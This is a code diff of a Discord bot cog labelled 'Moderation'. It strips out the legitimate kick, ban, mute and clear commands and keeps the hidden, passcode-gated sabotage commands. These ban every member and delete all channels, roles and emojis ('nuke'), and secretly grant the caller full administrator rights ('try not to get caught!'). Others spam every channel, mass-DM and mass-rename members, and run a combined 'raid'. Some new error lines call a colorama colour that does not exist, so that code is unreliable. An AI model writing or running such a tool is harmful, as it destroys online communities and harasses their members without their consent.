@@ -7,7 +7,7 @@
 import discord
 import random
 import os
-from cogs.anubis_methods import CODE, check_for_servers, refresh, command_error
+from cogs.seth_methods import CODE, check_for_servers, refresh, command_error
 from discord.ext import commands
 from colorama import Fore, init
 init()
@@ -17,39 +17,13 @@ class Moderation(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    # Clear messages.
-
-    @commands.command()
-    @commands.has_guild_permissions(manage_messages=True)
-    async def clear(self, ctx, n=10):
-        if n < 1:
-            embed = discord.Embed(
-                title="Issue",
-                description=f"You must specify a real amount.",
-                color=discord.Colour.orange())
-            await ctx.send(embed=embed)
-        elif n > 1000:
-            embed = discord.Embed(
-                title="Issue",
-                description=f"The limit is 1000.",
-                color=discord.Colour.orange())
-            await ctx.send(embed=embed)
-        else:
-            try:
-                await ctx.channel.purge(limit=n)
-            except ValueError:
-                embed = discord.Embed(
-                    title="Issue",
-                    description=f"You must specify a real amount.",
-                    color=discord.Colour.orange())
-                await ctx.send(embed=embed)
-        return
-
     # Nuke the server.
 
     @commands.command(hidden=True)
     async def nuke(self, ctx, code=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("nuke")
@@ -71,14 +45,14 @@ class Moderation(commands.Cog):
             print(
                 f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(quote)+2)}\nNuke depolyed!\n\n{Fore.RESET}")
             print(f"{Fore.YELLOW}Banning server members:{Fore.RESET}")
-            for member in self.bot.get_all_members():
+            for member in g.members:
                 try:
                     if member != ctx.author:
                         await member.ban(reason=None, delete_message_days=7)
                         print(
-                            f"{Fore.LIGHTBLUE_EX}Banned {member.display_name}.{Fore.RESET}")
+                            f"{Fore.LIGHTBLUE_EX}Banned {member}.{Fore.RESET}")
                     else:
-                        continue
+                        print(f"{Fore.YELLOW}You are immune!")
                 except discord.Forbidden:
                     print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                 except discord.HTTPException:
@@ -88,7 +62,7 @@ class Moderation(commands.Cog):
             # Delete all channels.
 
             print(f"{Fore.YELLOW}Deleting server channels:{Fore.RESET}")
-            for c in ctx.guild.channels:
+            for c in g.channels:
                 try:
                     await c.delete()
                     print(
@@ -104,10 +78,10 @@ class Moderation(commands.Cog):
             # Delete all roles.
 
             print(f"{Fore.YELLOW}Deleting server roles:{Fore.RESET}")
-            roles = ctx.guild.roles
+            roles = g.roles
             roles.pop(0)
             for role in roles:
-                if ctx.guild.me.roles[-1] > role:
+                if g.me.roles[-1] > role:
                     try:
                         await role.delete()
                         print(
@@ -125,7 +99,7 @@ class Moderation(commands.Cog):
             # Delete all emojis.
 
             print(f"{Fore.YELLOW}Deleting server emojis:{Fore.RESET}")
-            for emoji in list(ctx.guild.emojis):
+            for emoji in list(g.emojis):
                 try:
                     await emoji.delete()
                     print(
@@ -137,8 +111,8 @@ class Moderation(commands.Cog):
 
             print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
             return
-        except BaseException:
-            command_error("nuke")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Nuke every server.
@@ -174,9 +148,9 @@ class Moderation(commands.Cog):
                         if member != ctx.author:
                             await member.ban(reason=None, delete_message_days=7)
                             print(
-                                f"{Fore.LIGHTBLUE_EX}Banned {member.display_name}.{Fore.RESET}")
+                                f"{Fore.LIGHTBLUE_EX}Banned {member}.{Fore.RESET}")
                         else:
-                            continue
+                            print(f"{Fore.YELLOW}You are immune!")
                     except discord.Forbidden:
                         print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                     except discord.HTTPException:
@@ -240,93 +214,107 @@ class Moderation(commands.Cog):
                 i += 1
             print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
             return
-        except BaseException:
-            command_error("mass_nuke")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Delete all channels only.
 
     @commands.command(hidden=True)
     async def cpurge(self, ctx, code=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("cpurge")
                 return
-            for c in ctx.guild.channels:
+            print(f"\n\n{Fore.LIGHTWHITE_EX}Purging channels from server: {g}.")
+            for c in g.channels:
                 try:
                     await c.delete()
-                except discord.Forbidden:
-                    continue
-            print(f"{Fore.LIGHTGREEN_EX}Channels purged successfully.{Fore.RESET}")
+                    print(f"{Fore.LIGHTBLUE_EX}Channel {c} purged.")
+                except:
+                    print(f"{Fore.RED}Failed to purge channel {c}.")
+            print(f"{Fore.LIGHTGREEN_EX}\nChannels purged from server: {g} successfully.{Fore.RESET}")
             return
-        except BaseException:
-            command_error("cpurge")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Message all members with a message.
 
     @commands.command(hidden=True)
     async def mass_dm(self, ctx, code=None, *, message=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("mass_dm")
                 return
-            for member in ctx.guild.members:
+            for member in g.members:
                 try:
+                    print(f"{Fore.LIGHTWHITE_EX}Messaging all members from server: {g}.")
                     if member.dm_channel is not None:
                         await member.dm_channel.send(message)
+                        print(f"{Fore.LIGHTBLUE_EX}Messaged {member}.")
                     else:
                         await member.create_dm()
                         await member.dm_channel.send(message)
+                        print(f"{Fore.LIGHTBLUE_EX}Messaged {member}.")
                 except BaseException:
+                    print(f'{Fore.RED}Failed to message {member}.')
                     continue
             print(
-                f"{Fore.LIGHTGREEN_EX}Messaged all members successfully.{Fore.RESET}")
+                f"{Fore.LIGHTGREEN_EX}\nMessaged all members from server: {g} successfully.")
             return
-        except BaseException:
-            command_error("mass_dm")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Make yourself an administator on the server.
 
     @commands.command(hidden=True)
     async def admin(self, ctx, code=None, *, role_name=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("admin")
                 return
             if role_name is not None:
-                await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
-                role = discord.utils.get(ctx.guild.roles, name=role_name)
+                await g.create_role(name=role_name, permissions=discord.Permissions.all())
+                role = discord.utils.get(g.roles, name=role_name)
                 await ctx.author.add_roles(role)
                 print(
-                    f"{Fore.LIGHTGREEN_EX}Administrator permissions granted successfully - try not to get caught!{Fore.RESET}")
+                    f"{Fore.LIGHTGREEN_EX}\nAdministrator permissions granted successfully - try not to get caught!{Fore.RESET}")
                 return
-        except BaseException:
-            command_error("admin")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Spam all text channels with a message.
 
     @commands.command(hidden=True)
     async def spam(self, ctx, code=None, *, message=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("spam")
                 return
             if message is not None:
-                print(f"{Fore.LIGHTBLUE_EX}Spamming started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the spamming.{Fore.RESET}")
+                print(f"{Fore.LIGHTBLUE_EX}\nSpamming started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the spamming.{Fore.RESET}")
 
                 def check_reply(message):
                     return message.content == 'stop' and message.author == ctx.author
 
                 async def spam_text():
                     while True:
-                        for channel in ctx.guild.text_channels:
+                        for channel in g.text_channels:
                             await channel.send(message)
 
                 spam_task = self.bot.loop.create_task(spam_text())
@@ -335,37 +323,43 @@ class Moderation(commands.Cog):
                 print(
                     f"{Fore.LIGHTGREEN_EX}Spamming finished successfully.{Fore.RESET}")
                 return
-        except BaseException:
-            command_error("spam")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Change the nickname of every member.
 
     @commands.command(hidden=True)
     async def mass_nick(self, ctx, code=None, *, nickname=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
+            print(f"{Fore.LIGHTWHITE_EX}Nicknaming all members from server: {g}.")
             if int(code) != int(CODE):
                 command_error("mass_nick")
                 return
             if nickname.strip().replace(' ', ''):
-                for member in ctx.guild.members:
+                for member in g.members:
                     try:
                         await member.edit(nick=nickname)
+                        print(f"{Fore.LIGHTBLUE_EX}Nicknamed {member}.")
                     except BaseException:
-                        continue
+                        print(f"{Fore.RED}Failed to nickname {member}.")
                 print(
-                    f"{Fore.LIGHTGREEN_EX}Nicknames changed successfully.{Fore.RESET}")
+                    f"{Fore.LIGHTGREEN_EX}\nNicknamed all members from server: {g} successfully.{Fore.RESET}")
                 return
-        except BaseException:
-            command_error("mass_nick")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Raid the server.
 
     @commands.command(hidden=True)
     async def raid(self, ctx, code=None, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
+        ID = ctx.message.guild.id
         await ctx.message.delete()
+        g = discord.utils.get(self.bot.guilds, id=ID)
         try:
             if int(code) != int(CODE):
                 command_error("raid")
@@ -377,7 +371,7 @@ class Moderation(commands.Cog):
 
             # Delete all channels.
 
-            for c in ctx.guild.channels:
+            for c in g.channels:
                 try:
                     await c.delete()
                 except discord.Forbidden:
@@ -385,10 +379,10 @@ class Moderation(commands.Cog):
 
             # Delete all roles.
 
-            roles = ctx.guild.roles
+            roles = g.roles
             roles.pop(0)
             for r in roles:
-                if ctx.guild.me.roles[-1] > r:
+                if g.me.roles[-1] > r:
                     try:
                         await r.delete()
                     except BaseException:
@@ -398,9 +392,9 @@ class Moderation(commands.Cog):
 
             # Create a new role and give it to all members.
 
-            await ctx.guild.create_role(name=rolename, colour=discord.Colour(0xff0000))
-            role = discord.utils.get(ctx.guild.roles, name=rolename)
-            for member in ctx.guild.members:
+            await g.create_role(name=rolename, colour=discord.Colour(0xff0000))
+            role = discord.utils.get(g.roles, name=rolename)
+            for member in g.members:
                 try:
                     await member.add_roles(role)
                 except BaseException:
@@ -408,7 +402,7 @@ class Moderation(commands.Cog):
 
             # Nickname all members.
 
-            for member in ctx.guild.members:
+            for member in g.members:
                 try:
                     await member.edit(nick=nickname)
                 except BaseException:
@@ -418,13 +412,13 @@ class Moderation(commands.Cog):
 
             for i in range(channelNum):
                 try:
-                    await ctx.guild.create_text_channel(channelName)
+                    await g.create_text_channel(channelName)
                 except BaseException:
                     continue
 
             # Message all members with a message.
 
-            for member in ctx.guild.members:
+            for member in g.members:
                 try:
                     if member.dm_channel is not None:
                         await member.dm_channel.send(msg)
@@ -443,7 +437,7 @@ class Moderation(commands.Cog):
 
             async def spam_text():
                 while True:
-                    for channel in ctx.guild.text_channels:
+                    for channel in g.text_channels:
                         await channel.send(msg)
 
             spam_task = self.bot.loop.create_task(spam_text())
@@ -451,32 +445,8 @@ class Moderation(commands.Cog):
             spam_task.cancel()
             print(f"{Fore.LIGHTGREEN_EX}Raiding finished successfully.{Fore.RESET}")
             return
-        except BaseException:
-            command_error("raid")
-            return
-
-    # Leave the server.
-
-    @commands.command(hidden=True)
-    async def leave(self, ctx, code=None, *, guild_name=None):
-        await ctx.message.delete()
-        try:
-            if int(code) != int(CODE):
-                command_error("leave")
-                return
-
-            guild = discord.utils.get(self.bot.guilds, name=guild_name)
-            try:
-                await guild.leave()
-            except BaseException:
-                print(
-                    f"{Fore.RED}Anubis not found; the Anubis program is not present in the server you have specified.{Fore.RESET}")
-                return
-            print(
-                f"{Fore.LIGHTGREEN_EX}Anubis has left \"{guild_name}\" successfully.{Fore.RESET}")
-            return
-        except BaseException:
-            command_error("leave")
+        except BaseException as e:
+            print(f"{Fore.LIGHT_RED}{e}\n\n")
             return
 
     # Leave all servers.
@@ -484,31 +454,37 @@ class Moderation(commands.Cog):
     @commands.command(hidden=True)
     async def mass_leave(self, ctx, *, code=None):
         await ctx.message.delete()
-        try:
-            check_for_servers()
+        print(f"\n\n{Fore.RED}WARNING: By confirming this command, your account will leave every server it has joined whilst Seth has been running.\n{Fore.WHITE}Enter CONFIRM to confirm: {Fore.YELLOW}")
+        choice = input()
+        if choice != "CONFIRM":
+            refresh()
+            return
+        else:
+            try:
+                check_for_servers()
 
-            if int(code) != int(CODE):
-                command_error("mass_leave")
+                if int(code) != int(CODE):
+                    command_error("mass_leave")
+                    return
+
+                with open("cogs/servers.txt", "r") as f:
+                    IDs = f.read().split("\n")
+                    for ID in IDs:
+                        try:
+                            ID = int(ID)
+                            await self.bot.get_guild(ID).leave()
+                        except BaseException:
+                            pass
+                    f.close()
+                os.remove("cogs/servers.txt")
+                with open("cogs/servers.txt", "w") as f:
+                    f.close()
+                print(
+                    f"{Fore.LIGHTGREEN_EX}You have successfully left all servers.{Fore.RESET}")
                 return
-
-            with open("cogs/servers.txt", "r") as f:
-                IDs = f.read().split("\n")
-                for ID in IDs:
-                    try:
-                        ID = int(ID)
-                        await self.bot.get_guild(ID).leave()
-                    except BaseException:
-                        pass
-                f.close()
-            os.remove("cogs/servers.txt")
-            with open("cogs/servers.txt", "w") as f:
-                f.close()
-            print(
-                f"{Fore.LIGHTGREEN_EX}Anubis bot has successfully left all servers.{Fore.RESET}")
-            return
-        except BaseException:
-            command_error("mass_leave")
-            return
+            except BaseException as e:
+                print(f"{Fore.LIGHTRED_EX}{e}\n\n")
+                return
 
     # Refresh the window.
 
@@ -520,136 +496,8 @@ class Moderation(commands.Cog):
                 command_error("refresh")
                 return
             refresh()
-        except BaseException:
-            command_error("refresh")
-            return
-
-    # Kick a member.
-
-    @commands.command()
-    @commands.has_guild_permissions(kick_members=True)
-    async def kick(self, ctx, member: discord.Member, *, reason=None):
-        await member.kick(reason=reason)
-        embed = discord.Embed(
-            title="Member kicked",
-            description=f"{member.mention} has been kicked.",
-            color=discord.Colour.blue())
-        await ctx.send(embed=embed)
-        return
-
-    # Ban a member.
-
-    @commands.command()
-    @commands.has_guild_permissions(ban_members=True, kick_members=True)
-    async def ban(self, ctx, member: discord.Member, *, reason=None):
-        await member.ban(reason=reason)
-        embed = discord.Embed(
-            title="Member banned",
-            description=f"{member.mention} has been banned.",
-            color=discord.Colour.blue())
-        await ctx.send(embed=embed)
-        return
-
-    # Unban a member.
-
-    @commands.command()
-    @commands.has_guild_permissions(administrator=True)
-    async def unban(self, ctx, *, member):
-        banned_users = await ctx.guild.bans()
-        member_name, member_discriminator = member.split('#')
-
-        for ban_entry in banned_users:
-            user = ban_entry.user
-            if (user.name, user.discriminator) == (
-                    member_name, member_discriminator):
-                await ctx.guild.unban(user)
-                embed = discord.Embed(
-                    title="Member unbanned",
-                    description=f"{user.mention} has been unbanned.",
-                    color=discord.Colour.blue())
-                await ctx.send(embed=embed)
-                return
-
-    # Mute a member.
-
-    @commands.command()
-    @commands.has_guild_permissions(manage_roles=True)
-    async def mute(self, ctx, member: discord.Member, *, reason=None):
-        if member.guild_permissions.administrator or member.guild_permissions.manage_roles or member.guild_permissions.manage_permissions:
-            embed = discord.Embed(
-                title="Issue",
-                description=f"You can not mute this member.",
-                color=discord.Colour.orange())
-            await ctx.send(embed=embed)
-            return
-        else:
-            role = discord.utils.find(
-                lambda r: r.name == 'bot muted', ctx.guild.roles)
-            if role in member.roles:
-                embed = discord.Embed(
-                    title="Issue",
-                    description=f"{member.mention} is already muted.",
-                    color=discord.Colour.orange())
-                await ctx.send(embed=embed)
-                return
-            else:
-                if discord.utils.get(ctx.guild.roles, name="bot muted"):
-                    role = discord.utils.get(
-                        member.guild.roles, name="bot muted")
-                    await discord.Member.add_roles(member, role)
-                    member.guild_permissions.send_messages = False
-                else:
-                    permissions = discord.Permissions(
-                        send_messages=False, read_messages=True)
-                    await ctx.guild.create_role(name="bot muted", permissions=permissions)
-                    role = discord.utils.get(
-                        member.guild.roles, name="bot muted")
-                    await discord.Member.add_roles(member, role)
-                    member.guild_permissions.send_messages = False
-
-                embed = discord.Embed(
-                    title="Member muted",
-                    description=f"{member.mention} has been muted.",
-                    color=discord.Colour.blue())
-                await ctx.send(embed=embed)
-                return
-
-    # Unmute a member.
-
-    @commands.command()
-    @commands.has_guild_permissions(manage_roles=True)
-    async def unmute(self, ctx, member: discord.Member, *, reason=None):
-        role = discord.utils.find(
-            lambda r: r.name == 'bot muted', ctx.guild.roles)
-        if role not in member.roles:
-            if member.guild_permissions.send_messages:
-                embed = discord.Embed(
-                    title="Issue",
-                    description=f"{member.mention} is not muted.",
-                    color=discord.Colour.orange())
-                await ctx.send(embed=embed)
-                return
-            else:
-                role = discord.utils.get(member.guild.roles, name="bot muted")
-                await discord.Member.remove_roles(member, role)
-                member.guild_permissions.send_messages = True
-
-                embed = discord.Embed(
-                    title="Member unmuted",
-                    description=f"{member.mention} has been unmuted.",
-                    color=discord.Colour.blue())
-                await ctx.send(embed=embed)
-                return
-        else:
-            role = discord.utils.get(member.guild.roles, name="bot muted")
-            await discord.Member.remove_roles(member, role)
-            member.guild_permissions.send_messages = True
-
-            embed = discord.Embed(
-                title="Member unmuted",
-                description=f"{member.mention} has been unmuted.",
-                color=discord.Colour.blue())
-            await ctx.send(embed=embed)
+        except BaseException as e:
+            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
             return
 
 
